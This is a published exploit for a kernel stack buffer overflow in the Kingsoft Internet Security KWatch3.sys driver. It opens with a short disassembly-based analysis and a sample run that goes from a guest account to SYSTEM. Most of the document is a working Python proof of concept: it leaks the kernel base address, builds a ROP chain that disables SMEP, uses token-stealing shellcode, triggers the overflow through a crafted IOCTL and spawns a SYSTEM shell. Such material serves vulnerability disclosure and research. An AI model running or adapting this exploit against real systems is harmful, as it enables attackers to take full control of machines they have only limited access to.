"""
Kingsoft Antivirus/Internet Security 9+ Kernel Stack Buffer Overflow Privilege Escalation Vulnerability
Anti-Virus: http://www.kingsoft.co/downloads/kav/KAV100720_ENU_DOWN_331020_10.rar
Internet Security: http://www.kingsoft.co/downloads/kis/kis.rar

Summary:
========

This vulnerability allows local attackers to escalate privileges on vulnerable installations of Kingsoft Internet Security. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. The specific flaws exists within the processing of IOCTL 0x80030004 or 0x80030008 by the KWatch3.sys (internet security) kernel driver. The issue lies in the failure to properly validate user-supplied data which can result in a kernel stack buffer overflow. An attacker can leverage this vulnerability to execute arbitrary code under the context of kernel.

Vulnerability Analysis:
=======================

I am only going to detail a single bug since both ioctl handlers are *almost* identical. Inside the KWatch3.sys driver, we can see the following handler code for the first ioctl code (0x80030004)

; jumptable 000117C1 case 0

.text:000117C8 loc_117C8:                                      ; CODE XREF: sub_11790+31
.text:000117C8                                                 
.text:000117C8                 push    ebx                     ; our input buffer size
.text:000117C9                 lea     ecx, [esp+58h+var_40]   ; this is a fixed size stack buffer of 0x40
.text:000117CD                 push    edi                     ; our input buffer
.text:000117CE                 push    ecx                     ; char *
.text:000117CF                 call    strncpy                 ; stack buffer overflow
.text:000117D4                 add     esp, 0Ch
.text:000117D7                 lea     edx, [esp+54h+var_40]
.text:000117DB                 push    edx                     ; char *
.text:000117DC                 mov     [esp+ebx+58h+var_40], 0
.text:000117E1                 call    sub_167B0
.text:000117E6                 pop     edi
.text:000117E7                 mov     esi, eax
.text:000117E9                 pop     esi
.text:000117EA                 pop     ebp
.text:000117EB                 pop     ebx
.text:000117EC                 add     esp, 44h
.text:000117EF                 retn    8

Additional bugs:
~~~~~~~~~~~~~~~~

Out-of-Bounds Read vulnerabilities exist in the following ioctls as well:

- 0x8003001c
- 0x80030020
- 0x80030024
- 0x80030028

There is more, but I gave up. This happens because there are several functions that contain code like this:

.text:000172A0 loc_172A0:                                   ; CODE XREF: sub_17280+29
.text:000172A0                 mov     cx, [eax]            ; @eax is our input buffer
.text:000172A3                 add     eax, 2
.text:000172A6                 test    cx, cx
.text:000172A9                 jnz     short loc_172A0      ; jump if there is no null word

So all we have to do is set our input buffer to contain no null word values. Note that these only trigger a bug check if special pool is enabled and dont look exploitable (no leaking in the output buffer)

Example:
========

c:\Users\Guest\Desktop>whoami
victim\guest

c:\Users\Guest\Desktop>poc.py

        --[ Kingsoft Internet Security Kernel Stack Overflow EoP Exploit ]
                       Steven Seeley (mr_me) of Source Incite

(+) enumerating kernel base address...
(+) found nt base at 0x8147e000
(+) allocating shellcode @ 0x24242424
(+) sending stack overflow...
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

c:\Users\Guest\Desktop>whoami
nt authority\system

c:\Users\Guest\Desktop>

References:
===========

- https://sizzop.github.io/2016/09/13/kernel-hacking-with-hevd-part-5.html
"""
import sys
from ctypes import *
from time import sleep
from ctypes.wintypes import *
import struct
import os
from random import choice

kernel32 = windll.kernel32
ntdll = windll.ntdll

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

def get_ioctl():
    return choice([0x80030004, 0x80030008])
    
def alloc_shellcode(base, input_size):
    """ 
    allocates some shellcode
    """
    print "(+) allocating shellcode @ 0x%x" % base
    baseadd = c_int(base)
    size    = c_int(input_size)

    # --[ setup]
    input  = struct.pack("<I", 0x000506f8)      # bypass smep

    # --[ setup]
    input += "\x60"                             # pushad
    input += "\x64\xa1\x24\x01\x00\x00"         # mov eax, fs:[KTHREAD_OFFSET]

    # I have to do it like this because windows is a little special
    # this just gets the EPROCESS. Windows 7 is 0x50, now its 0x80.
    input += "\x8d\x40\x70"                     # lea eax, [eax+0x70];
    input += "\x8b\x40\x10"                     # mov eax, [eax+0x10];
    input += "\x89\xc1"                         # mov ecx, eax (Current _EPROCESS structure)

    # win 10 rs2 x86 TOKEN_OFFSET = 0xfc
    # win 07 sp1 x86 TOKEN_OFFSET = 0xf8
    input += "\x8B\x98\xfc\x00\x00\x00"         # mov ebx, [eax + TOKEN_OFFSET]

    # --[ copy system PID token]
    input += "\xba\x04\x00\x00\x00"             # mov edx, 4 (SYSTEM PID)
    input += "\x8b\x80\xb8\x00\x00\x00"         # mov eax, [eax + FLINK_OFFSET] <-|
    input += "\x2d\xb8\x00\x00\x00"             # sub eax, FLINK_OFFSET           |
    input += "\x39\x90\xb4\x00\x00\x00"         # cmp [eax + PID_OFFSET], edx     |
    input += "\x75\xed"                         # jnz                           ->|

    # win 10 rs2 x86 TOKEN_OFFSET = 0xfc
    # win 07 sp1 x86 TOKEN_OFFSET = 0xf8
    input += "\x8b\x90\xfc\x00\x00\x00"         # mov edx, [eax + TOKEN_OFFSET]
    input += "\x89\x91\xfc\x00\x00\x00"         # mov [ecx + TOKEN_OFFSET], edx

    # --[ recover]
    input += "\x61"                             # popad
    input += "\x83\xc4\x0c"                     # adjust the stack by 0xc
    input += "\x31\xc0"                         # return NTSTATUS = STATUS_SUCCESS
    input += "\xc3"                             # ret

    # filler
    input += "\x43" * (input_size-len(input))
    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
                                              POINTER(c_int), c_int, c_int]
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
                                             byref(size), 
                                             MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        print "(-) Error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
        return False
    written = c_ulong()
    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
    if write == 0:
        print "(-) Error while writing our input buffer memory: %s" % write
        return False
    return True

def alloc(base, input_size, ip):
    baseadd   = c_int(base)
    size = c_int(input_size)
    input = "\x44" * 0x40                       # offset to ip

    # start rop chain
    input += struct.pack("<I", nt + 0x51976f)   # pop ecx; ret
    input += struct.pack("<I", 0x75757575)      # junk
    input += struct.pack("<I", 0x76767676)      # junk
    input += struct.pack("<I", ip)              # load a ptr to 0x506f8
    input += struct.pack("<I", nt + 0x04664f)   # mov eax, [ecx]; ret
    input += struct.pack("<I", nt + 0x22f2da)   # mov cr4,eax; ret
    input += struct.pack("<I", ip + 0x4)        # &shellcode

    # filler
    input += "\x43" * (input_size-len(input))

    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
                                              POINTER(c_int), c_int, c_int]
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
                                             byref(size), 
                                             MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        print "(-) error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
        sys.exit()
    written = c_ulong()
    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
    if write == 0:
        print "(-) error while writing our input buffer memory: %s" % write
        sys.exit()

def we_can_trigger_overflow():
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    IOCTL_VULN    = get_ioctl()
    DEVICE_NAME   = "\\\\.\\KWatch3"
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    ip            = 0x24242424
    
    inputbuffer   = 0x41414141
    inputbuffer_size = 0x60
    outputbuffer_size = 0x1000
    outputbuffer      = 0x20000000
    
    alloc(inputbuffer, inputbuffer_size, ip)
    alloc_shellcode(ip, 0x100)
    alloc(outputbuffer, 0x100, ip)

    IoStatusBlock = c_ulong()
    if driver_handle:
        print "(+) sending stack overflow..."
        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       IOCTL_VULN,
                                       inputbuffer,
                                       inputbuffer_size,
                                       outputbuffer,
                                       outputbuffer_size
                                       )
        return True
    return False

def we_can_leak_the_base():
    """
    Get kernel base address.
    This function uses psapi!EnumDeviceDrivers which is only callable
    from a non-restricted caller (medium integrity or higher). Also the
    assumption is made that the kernel is the first array element returned.
    """
    global nt
    print "(+) enumerating kernel base address..."
    
    c_ulong_array = c_ulong * 1024
    lpImageBase = c_ulong_array()
    szDriver    = c_ulong_array()
    cb = sizeof(lpImageBase)
    lpcbNeeded = c_long()

    res = windll.psapi.EnumDeviceDrivers(byref(lpImageBase),
                                         sizeof(lpImageBase),
                                         byref(lpcbNeeded))
    if not res:
        print "(-) unable to get kernel base: " + FormatError()
        sys.exit(-1)

    # nt is the first one
    nt = lpImageBase[0]

    # find KWatch3, for if it doesnt exist, we can't exploit it now...
    for driver in lpImageBase:
        lpBaseName = create_string_buffer("", MAX_PATH)
        GetDeviceDriverBaseName = windll.psapi.GetDeviceDriverBaseNameA
        GetDeviceDriverBaseName.argtypes = [LPVOID, LPSTR, DWORD]
        if(GetDeviceDriverBaseName(driver, lpBaseName, MAX_PATH)):
            if lpBaseName.value == "KWatch3.sys":
                return True
    return False

def main():
    print "\n\t--[ Kingsoft Internet Security Kernel Stack Overflow EoP Exploit ]"
    print "\t               Steven Seeley (mr_me) of Source Incite\r\n"
        
    if release() != "10" or architecture()[0] != "32bit":
        print "(-) although this exploit may work on this system,"
        print "    it was only designed for Windows 10 x86."
        sys.exit(-1)
        
    if we_can_leak_the_base():
        print "(+) found nt base at 0x%08x" % (nt)
        if we_can_trigger_overflow():
            os.system("cmd.exe")
        else:
            print "(-) it appears that kingsoft Internet Security is not vulnerable!"
            sys.exit(-1)
    else:
        print "(-) it appears that kingsoft Internet Security is not installed!"
        sys.exit(-1)

if __name__ == '__main__':
    main()